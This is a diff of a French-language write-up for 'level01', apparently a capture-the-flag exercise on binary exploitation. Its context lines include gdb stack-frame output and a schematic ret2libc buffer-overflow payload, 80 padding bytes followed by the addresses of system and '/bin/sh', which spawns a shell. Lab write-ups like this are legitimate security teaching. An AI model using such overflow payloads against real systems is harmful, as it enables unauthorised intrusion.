@@ -1,3 +1,6 @@
+# LEVEL 01
+
+
 Le binaire level01 est composé de 3 fonction et lit 2 fois sur l'entrée standard via **fgets**:
 
 <pre>
@@ -29,7 +32,7 @@ i f
 
 Stack level 0, frame at 0xffffd720:
  eip = 0x8048579 in main; saved eip 0xf7e45513
- Arglist at 0xffffd718, args: 
+ Arglist at 0xffffd718, args:
  Locals at 0xffffd718, Previous frame's sp is 0xffffd720
  Saved registers:
   ebx at 0xffffd710, ebp at 0xffffd718, edi at 0xffffd714, eip at 0xffffd71c
@@ -86,7 +89,7 @@ Nous pouvons donc formater notre exploit de la façon suivante:
 <pre>
 ./level01
 "dat_will"
-"A*80 + &system + DUMM + &(/bin/sh)" 
+"A*80 + &system + DUMM + &(/bin/sh)"
 </pre>
 
 # EXPLOIT
